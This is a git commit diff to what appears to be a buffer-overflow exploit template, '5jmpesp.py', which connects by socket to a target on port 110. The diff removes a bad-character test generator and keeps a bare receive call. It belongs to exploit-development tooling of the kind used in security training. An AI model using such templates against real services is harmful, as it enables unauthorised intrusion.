4028b0fdad076a7b138cca0ce07f971d816a1fbf
Tym Rabchuk <tymrabchuk@gmail.com>
2019-07-04 17:56:10 -0400

    Update 5jmpesp.py

--- BO/templates/5jmpesp.py
+++ BO/templates/5jmpesp.py
@@ -10,22 +10,7 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
-data = s.recv(1024)
-
-badchar_test = "" #start with empty string
-
-#determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program
-
-badchars = [0x00]  
-
-#generate the string using a for loop 
-for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
-	if i not in badchars: #skip the badchars
-		badchar_test += chr(i) #append each non-badchar char to the string.
-
-#open a file for writing ('w') the string as binary ('b') data
-with open("badchar_test.bin", "wb") as f:
-	f.write(badchar_test)
+s.recv(1024)
 
 #build a message
 
